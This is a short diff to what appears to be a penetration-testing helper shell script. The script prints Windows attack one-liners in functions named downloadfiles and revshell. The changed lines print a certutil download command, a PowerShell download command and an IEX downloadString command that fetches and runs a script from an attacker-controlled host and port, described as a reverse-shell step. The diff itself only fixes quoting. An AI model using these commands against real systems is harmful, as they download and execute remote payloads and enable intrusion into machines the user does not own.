@@ -51,11 +51,11 @@ function downloadfiles {
 
   do_title_bar "windows files"
   echo "# DOS" | lolcat
-  echo "certutil.exe -urlcache -split -f $url filename.exe"
+  echo "certutil.exe -urlcache -split -f \"$url\" filename.exe"
   echo ""
 
   echo "# Powershell get file" | lolcat
-  echo "wget '$url' -outfile filename.exe'"
+  echo "wget \"$url\" -outfile filename.exe"
   echo ""
 }
 
@@ -79,7 +79,7 @@ function revshell {
   do_title_bar "windows rev shell"
 
   echo "# Powershell execute script (like a reverse shell)" | lolcat
-  echo "IEX(New-Object Net.WebClient).downloadString( "http://$lhost:$lport/filename.ps1" )'"
+  echo "IEX(New-Object Net.WebClient).downloadString( \"http://$lhost:$lport/filename.ps1\" )"
   echo ""
 
   downloadfiles "http://$lhost:$lport/filename.exe"
